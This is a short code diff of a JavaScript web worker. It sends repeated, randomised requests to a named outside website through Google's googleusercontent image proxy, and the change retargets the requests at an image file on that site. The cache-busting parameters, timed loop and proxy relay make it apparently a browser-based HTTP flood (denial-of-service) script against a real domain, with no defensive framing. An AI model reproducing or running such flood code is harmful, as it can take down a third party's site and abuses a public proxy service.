@@ -2,7 +2,7 @@ self.addEventListener('message', function(e) {
 
 	setInterval(function(){
 
-		var target = 'http://saunaetkiliatlet.com/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
+		var target = 'http://saunaetkiliatlet.com/u4.jpg?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
 
 		var url = 'https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?url='+encodeURIComponent(target)+'&container=none';
 
